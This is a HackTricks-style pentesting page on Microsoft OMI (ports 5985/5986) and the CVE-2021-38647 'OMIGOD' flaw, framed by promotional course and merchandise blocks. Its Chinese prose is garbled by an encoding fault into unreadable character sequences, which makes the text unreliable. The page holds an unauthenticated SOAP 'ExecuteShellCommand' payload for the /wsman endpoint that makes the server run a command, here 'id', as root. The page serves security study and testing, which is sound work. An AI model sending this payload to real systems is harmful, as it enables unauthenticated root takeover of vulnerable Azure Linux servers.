# 5985,5986 - æ¸—é€æµ‹è¯• OMI

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS çº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

* æ‚¨åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨ HackTricks ä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**ï¼Ÿæˆ–è€…æƒ³è¦è®¿é—®**PEASS çš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½ HackTricks çš„ PDF**ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* æ¢ç´¢æˆ‘ä»¬çš„ç‹¬å®¶[NFTs é›†åˆ](https://opensea.io/collection/the-peass-family) - [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ä¸Šå…³æ³¨æˆ‘ ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **é€šè¿‡å‘ [hacktricks ä»“åº“](https://github.com/carlospolop/hacktricks) å’Œ [hacktricks-cloud ä»“åº“](https://github.com/carlospolop/hacktricks-cloud) æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§**ã€‚

</details>

### **åŸºæœ¬ä¿¡æ¯**

**OMI** æ˜¯å¾®è½¯æ¨å‡ºçš„ä¸€æ¬¾**å¼€æº**å·¥å…·ï¼Œç”¨äºè¿œç¨‹é…ç½®ç®¡ç†ã€‚å®ƒå¯¹äºåœ¨ Azure ä¸Šä½¿ç”¨ä»¥ä¸‹æœåŠ¡çš„ Linux æœåŠ¡å™¨å°¤ä¸ºé‡è¦ï¼š

- **Azure è‡ªåŠ¨åŒ–**
- **Azure è‡ªåŠ¨æ›´æ–°**
- **Azure è¿è¥ç®¡ç†å¥—ä»¶**
- **Azure æ—¥å¿—åˆ†æ**
- **Azure é…ç½®ç®¡ç†**
- **Azure è¯Šæ–­**

å½“è¿™äº›æœåŠ¡è¢«æ¿€æ´»æ—¶ï¼Œè¿›ç¨‹ `omiengine` ä¼šä»¥ root èº«ä»½å¯åŠ¨å¹¶åœ¨æ‰€æœ‰æ¥å£ä¸Šç›‘å¬ã€‚

ä½¿ç”¨çš„**é»˜è®¤ç«¯å£**ä¸º **5985**ï¼ˆhttpï¼‰å’Œ **5986**ï¼ˆhttpsï¼‰ã€‚

### **[CVE-2021-38647 æ¼æ´](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-38647)**

2021 å¹´ 9 æœˆ 16 æ—¥è§‚å¯Ÿåˆ°ï¼Œåœ¨ Azure éƒ¨ç½²çš„ Linux æœåŠ¡å™¨ä¸­ï¼Œç”±äºä½¿ç”¨äº†æ˜“å—æ”»å‡»çš„ OMI ç‰ˆæœ¬ï¼Œå­˜åœ¨æ¼æ´ã€‚è¯¥æ¼æ´å­˜åœ¨äº OMI æœåŠ¡å™¨é€šè¿‡ `/wsman` ç«¯ç‚¹å¤„ç†æ¶ˆæ¯æ—¶ï¼Œæ— éœ€èº«ä»½éªŒè¯å¤´éƒ¨å³å¯æˆæƒå®¢æˆ·ç«¯çš„æƒ…å†µã€‚

æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œå‘é€ä¸å¸¦èº«ä»½éªŒè¯å¤´éƒ¨çš„â€œExecuteShellCommandâ€ SOAP è´Ÿè½½ï¼Œè¿«ä½¿æœåŠ¡å™¨ä»¥ root æƒé™æ‰§è¡Œå‘½ä»¤ã€‚
```xml
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing"
...
<s:Body>
<p:ExecuteShellCommand_INPUT xmlns:p="http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem">
<p:command>id</p:command>
<p:timeout>0</p:timeout>
</p:ExecuteShellCommand_INPUT>
</s:Body>
</s:Envelope>
```
## å‚è€ƒèµ„æ–™

* [https://www.horizon3.ai/omigod-rce-vulnerability-in-multiple-azure-linux-deployments/](https://www.horizon3.ai/omigod-rce-vulnerability-in-multiple-azure-linux-deployments/)
* [https://blog.wiz.io/omigod-critical-vulnerabilities-in-omi-azure/](https://blog.wiz.io/omigod-critical-vulnerabilities-in-omi-azure/)

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* æ‚¨åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**å—ï¼Ÿæˆ–è€…æ‚¨æƒ³è®¿é—®**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[NFTsæ”¶è—å“**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ–åœ¨**Twitter**ä¸Šå…³æ³¨æˆ‘ ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **é€šè¿‡å‘[hacktricks repo](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§**ã€‚

</details>
